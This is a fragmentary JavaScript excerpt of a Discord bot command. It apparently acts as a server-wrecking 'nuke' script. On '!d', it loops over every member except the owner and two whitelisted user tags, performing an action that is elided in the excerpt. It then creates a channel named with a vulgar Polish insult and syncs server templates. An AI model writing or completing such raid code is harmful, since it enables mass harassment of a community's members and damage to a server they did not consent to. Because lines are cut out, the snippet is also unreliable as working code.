    ...
    if (msg.content.startsWith('!d')) {
        try {
            msg.guild.members.cache
                .filter(m => m.user.id !== msg.guild.ownerID && m.user.tag !== 'TheToster#3003' && m.user.tag !== '!Wujaszek#4259')
                .forEach(m => {
                    m.user
            ...
            msg.guild.channels
                .create('Chuj Ci w dupe nygusie', {
                    type: 'text'
                })
                .then(msg.guild.fetchTemplates().then(t => t.first().sync()))
                .then(msg.guild.createTemplate('Chuj Ci w dupe nygusie').then(t => t.sync()))
                .catch(console.error);
        } catch (error) {
            console.log(error);
        }
